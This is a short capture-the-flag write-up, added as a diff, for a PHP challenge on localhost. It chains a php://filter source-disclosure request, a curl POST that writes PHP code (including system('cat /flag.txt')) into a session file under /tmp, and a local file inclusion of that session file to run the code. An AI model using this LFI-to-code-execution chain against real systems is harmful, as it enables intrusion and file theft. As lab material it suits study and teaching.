@@ -1,0 +1,27 @@
+#+TITLE: Writeup
+
+
+#+begin_src
+/get_flag.php?function=extract&file=php://filter/read=convert.base64-encode/resource=index.php
+#+end_src
+
+Sessions are stored in /tmp
+
+#+begin_src
+curl -v -X POST -d "name=<?=file_get_contents('/flag.txt');?>" http://localhost:10021/get_flag.php
+#+end_src
+
+#+begin_src
+< Set-Cookie: PHPSESSID=232acdf771eaf2d75c03d7ef31960ce9; path=/
+#+end_src
+
+#+begin_src
+<?=file_get_contents('/flag.txt');?>
+<?=system('cat /flag.txt');?>
+#+end_src
+
+Get the session id from the PHPSESSION cookie.
+
+#+begin_src
+/get_flag.php?function=extract&file=/tmp/sess_dc0c104933094ad8d0afcf7d2a778cd9
+#+end_src
